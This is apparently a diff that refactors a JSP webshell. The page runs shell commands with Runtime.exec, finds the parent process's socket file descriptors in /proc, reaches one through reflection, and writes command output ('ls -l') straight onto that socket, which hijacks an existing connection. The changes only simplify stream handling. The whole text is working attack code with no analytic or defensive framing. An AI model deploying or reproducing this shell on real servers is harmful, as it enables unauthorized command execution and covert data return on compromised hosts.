@@ -2,36 +2,26 @@
 <%
     String command  = "ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\"[\"}''{print $2}'|sed 's/.$//'";
     String[] cmd = new String[]{"/bin/sh", "-c", command };
-    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
-    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
-    java.io.BufferedReader br = new java.io.BufferedReader(isr);
+    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
     java.util.List<String> res1 = new java.util.ArrayList<>();
     String line = "";
     while ((line = br.readLine()) != null){
         res1.add(line);
     }
-
-    isr.close();
     br.close();
-    in.close();
 
     Thread.sleep(2000);
 
     command  = "ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'";
     cmd = new String[]{"/bin/sh", "-c", command };
-    in = Runtime.getRuntime().exec(cmd).getInputStream();
-    isr  = new java.io.InputStreamReader(in);
-    br = new java.io.BufferedReader(isr);
+    br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
     java.util.List<String> res2 = new java.util.ArrayList<>();
     while ((line = br.readLine()) != null){
         res2.add(line);
     }
-
-    isr.close();
-    br.close();
-    in.close();
+	br.close();
 
     int index = 0;
     int max = 0;
@@ -55,9 +45,7 @@
     c.setAccessible(true);
 
     cmd = new String[]{"/bin/sh", "-c", "ls -l" };
-    in = Runtime.getRuntime().exec(cmd).getInputStream();
-    isr  = new java.io.InputStreamReader(in);
-    br = new java.io.BufferedReader(isr);
+    br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
     StringBuilder sb = new StringBuilder();
     while ((line = br.readLine()) != null){
@@ -68,8 +56,5 @@
     os.write(sb.toString().getBytes());
 
     br.close();
-    isr.close();
-    in.close();
+	os.close();
 %>
-</body>
-</html>
